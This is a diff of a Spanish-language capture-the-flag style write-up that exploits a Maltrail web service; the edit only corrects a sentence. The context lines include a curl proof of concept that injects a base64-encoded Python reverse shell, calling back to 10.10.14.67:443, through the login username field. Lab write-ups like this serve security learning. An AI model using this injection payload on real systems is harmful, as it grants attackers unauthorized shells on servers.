@@ -119,7 +119,7 @@ Vemos que hay una pagina corriendo internamente. Podemos mandar un curl y almace
 Se trata de **Maltrail**, en la parte inferior de la pagina viene la versión que esta actualmente en uso:
 ![[Pasted image 20230708145552.png]]
 
-En **Google** podemos encontrar un PoC que nos muestra como ejecutar remotamente en el servidor de la siguiente manera:
+En **Google** podemos encontrar un PoC que nos muestra como ejecutar codigo remotamente en el servidor de la siguiente manera:
 ```
 # curl -s -X POST "http://10.129.150.8:55555/vnzk6nc" --data 'username=`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjY3Iiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJwo=|base64 -d|sh`'
 ```
